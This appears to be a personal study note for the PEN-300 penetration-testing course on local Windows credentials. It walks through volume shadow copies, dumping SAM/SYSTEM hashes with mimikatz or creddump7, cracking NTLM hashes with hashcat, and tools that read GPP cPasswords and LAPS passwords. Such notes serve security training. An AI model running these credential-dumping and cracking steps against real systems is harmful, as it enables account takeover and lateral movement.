# PEN-300

#### Local Windows Credentials

## SAM credentials

***theory***: 

Local Windows credentials are stored in the Security Account Manager (SAM) database as password hashes using the NTLM hashing format, which is based on the MD4 algorithm.

We can reuse acquired NTLM hashes to authenticate to a different machine, as long as the hash is tied to a user account and password registered on that machine.

Although it is rare to find matching local credentials between disparate machines, the built-in default-named Administrator account is installed on all Windows-based machines.  


***Attack***:  

To get local client workstation name and administrator RID.  Follow commands below
```plaintext
$env:computername
[wmi] "Win32_userAccount.Domain='client',Name='Administrator'"
```
<br>

<img width="857" height="343" alt="image" src="https://github.com/user-attachments/assets/1f7e1521-032f-4e7a-92f6-0f1827ae132d" />



1) Create shadow copy:          wmic shadowcopy call create Volume='C:\'
2) Locate Shadow copy:          vssadmin list shadows
3) Copy SYSTEM / SAM off of host  
4) mimikatz lsadump::sam /system:systemfile /sam:samfile  
   OR
   creddump7: python pwdump.py ~/data/sam/system ~/data/sam/sam  
   <br>
6) Hashcat the password:  

**Mask attack** ./hashcat64.bin -m 1000 -a 3 -w 3 -O hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1?1 -i --increment-min=5
**Password List** .\hashcat.exe -m 1000 -a 0 -w 3 -O hash.txt password_list.txt
<br>

# Hardening the Local Administrator Account

### CPassword  

**Cpassword in the SYSVOL folder on the DC can be viewed with Get-GPPPassword.ps1**  

[Get-GPPPassword.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Exfiltration/Get-GPPPassword.ps1)

<br><br>


### LAPS - Local Administrator Password Solution  

***LAPS Toolkit for LAPS enumeration***

[Laps ToolKit download](https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/refs/heads/master/LAPSToolkit.ps1)

**Get-LAPSComputers**:  
Displays all computers with LAPS enabled, password expriation, and password if user has access  

**Find-LAPSDelegatedGroups:**  
Searches through all OUs to see which AD groups can read the ms-Mcs-AdmPwd attribute  

**Find-AdmPwdExtendedRights**  
Parses through ExtendedRights for each AD computer with LAPS enabled and looks for which group has read access and if any user has "All Extended Rights". Sysadmins may not be aware the users with All Extended Rights can view passwords and may be less protected than the users in the delegated groups. An example is the user which adds a computer to the domain automatically receives the "All Extended Rights" permission. Since this function will parse ACLs for each AD computer, this can take very long with a larger domain.  
